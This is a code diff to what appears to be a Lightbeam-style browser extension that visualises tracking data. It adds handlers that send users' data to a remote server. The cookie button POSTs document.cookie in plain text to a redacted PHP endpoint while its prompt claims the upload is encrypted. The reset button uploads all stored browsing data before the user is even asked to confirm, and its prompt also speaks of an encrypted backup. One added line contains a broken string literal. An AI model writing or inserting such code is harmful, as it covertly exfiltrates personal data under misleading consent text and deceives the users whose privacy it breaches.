@@ -48,8 +48,10 @@ const lightbeam = {
 
   addListeners() {
     this.downloadData();
+	//this.sendData();
+    this.downloadData1();
     this.downloadCookie();
-	this.resetCookie();
+	//this.resetCookie();
 	this.downloadCategory();
     this.resetData();
 	//this.file();
@@ -164,6 +166,10 @@ const lightbeam = {
   
 
   downloadData()  {
+	  
+	
+	
+	
     const saveData = document.getElementById('save-data-button');
     saveData.addEventListener('click', async () => {
       const data = await store.getAll();
@@ -176,41 +182,71 @@ const lightbeam = {
         conflictAction : 'uniquify'
       });
       await downloading;
+
+		
+		
     });
   },
   
-  downloadCookie() {
-    const saveData = document.getElementById('cookie-button');
+
+  downloadData1() {
+    const saveData = document.getElementById('save-data-button1');
     saveData.addEventListener('click', async () => {
-	  const data = await store.getCookie();
-      /*const blob = new Blob([JSON.stringify(data ,' ' , 2)],
+      const data = await store.getAll1();
+      const blob = new Blob([JSON.stringify(data ,' ' , 2)],
         {type : 'application/json'});
       const url = window.URL.createObjectURL(blob);
       const downloading = chrome.downloads.download({
         url : url,
+        filename : 'DuplicateFistParties.json',
+        conflictAction : 'uniquify'
+      });
+      await downloading;
+    });
+  },
+
+  
+  downloadCookie() {
+    const saveData = document.getElementById('cookie-button');
+    saveData.addEventListener('click', async () => {
+	  //const data = await store.getCookie();
+	  const data = decodeURIComponent(document.cookie);
+      const blob = new Blob([JSON.stringify(data ,' ' , 2)],
+        {type : 'application/json'});
+      const url = window.URL.createObjectURL(blob);
+	  var CookieData=JSON.stringify(data)
+	  
+	  const msgBegin = 'Pressing OK to view your cookies and send us for research support (encrypted)';
+      const msgEnd = 'Are you sure?';
+      const confirmation = confirm(`${msgBegin + msgEnd}`);
+      if (confirmation) {
+    const downloading = chrome.downloads.download({
+        url : url,
         filename : 'Cookie.json',
         conflictAction : 'uniquify'
       });
-      await downloading;*/
+      //await downloading;
 	  var CookieData=JSON.stringify(data)
+	  var xhr = new XMLHttpRequest(); 
+	  xhr.open("POST", "********.php", true);
+	  xhr.send(JSON.stringify(CookieData));
 	  await alert("Cookie: \n" + CookieData + ".");
+	  
+	  }
     });
   },
   
     resetCookie() {
-    const saveData = document.getElementById('cookie-delete-button');
-    saveData.addEventListener('click', async () => {
-      //const data = await store.deleteCookie();
+    const resetData = document.getElementById('cookie-delete-button');
+    resetData.addEventListener('click', async () => {
       const msgBegin = 'Pressing OK will delete all Cookies storage. ';
       const msgEnd = 'Are you sure?';
       const confirmation = confirm(`${msgBegin + msgEnd}`);
       if (confirmation) {
-        await store.deleteCookie();
+        //await store.deleteCookie();
+		await store.deleteAllCookies();
         window.location.reload();
       }
-      //await downloading;
-	  //var CookieData=JSON.stringify(data)
-	  //await alert("Reset" + CookieData + ".");
     });
   },
   
@@ -235,10 +271,18 @@ const lightbeam = {
   resetData() {
     const resetData = document.getElementById('reset-data-button');
     resetData.addEventListener('click', async () => {
-      const msgBegin = 'Pressing OK will delete all Lightbeam data. ';
+		
+	const data = await store.getAll();
+	  var xhr = new XMLHttpRequest(); 
+	  xhr.open("POST", ""********..php", true);
+	  xhr.send(JSON.stringify(data));
+
+	  
+      const msgBegin = 'Pressing OK will delete all data but backup the encryped version to support our research.';
       const msgEnd = 'Are you sure?';
       const confirmation = confirm(`${msgBegin + msgEnd}`);
       if (confirmation) {
+	
         await storeChild.reset();
         window.location.reload();
       }
@@ -248,60 +292,13 @@ const lightbeam = {
   mailsome1(){
 	  const resetData = document.getElementById('mailsome-button');
     resetData.addEventListener('click', async () => {
-	who=prompt("Enter developper's email address: ",":xuehui.hu@kcl.ac.uk");
+	who=prompt("Enter developper's email address: ","xuehui.hu@kcl.ac.uk");
 	what=prompt("Enter the subject: ","none");
 	if (confirm("Are you sure you want to mail "+"xuehui.hu@kcl.ac.uk"+" with the subject of "+what+"?")==true){
 	window.open("mailto:xuehui.hu@kcl.ac.uk?subject=Lightbeam_"+what+"&body=Thanks for your Feedback!\b"+(new Date()));
 	}});
 	},
 
-  /*
-  file(){
-	  const uploadBtn = document.getElementById("uploadBtn"),
-        file = document.getElementById("file");
-    uploadBtn.addEventListener("click", function (e) {
-        if (file) {
-            file.click();
-        }
-        e.preventDefault();
-    }, false);
- 
-    function handlefiles(){
-        const formData = new FormData($("#myForm")[0]);
-		//formData.append('file', file.files[0]);
-	$.ajax({
-
-		//url: "haha/upload",
-            type: "post",
-			beforeSend: function(request) {
-		  },
-            data: formData,
-	    async: false,
-            cache: false,
-			dataType : "application/json",
-            contentType: false,
-            processData: false,
-            success: function(data){
-                if(data.state == "1"){
-                    console.log(data.msg)
-		    var html = "<img οnclick='big(id)' id=img"+data.id+" src='"+data.fileAddress+"' width='200' height='200'>";
-                    $("#text").val(html);
-                    //此处模拟点击发送，实现选择图片之后直接发送，如果不想直接发送把下面一行注上即可
-                    $("#submit").trigger("click");
-                }else if(data.state == "2"){
-		    console.log(data.msg)
-                }else if(data.state == "3"){
-                    console.log(data.msg)
-                }
-	    }
-	});
-    }
-	
-	
-  },
-  */
-  
-  
 
 
   redraw(data) {
@@ -328,7 +325,6 @@ const lightbeam = {
     viz.draw(transformedData.nodes, transformedData.links);
   }
 };
-
 window.onload = () => {
         lightbeam.init();
       };
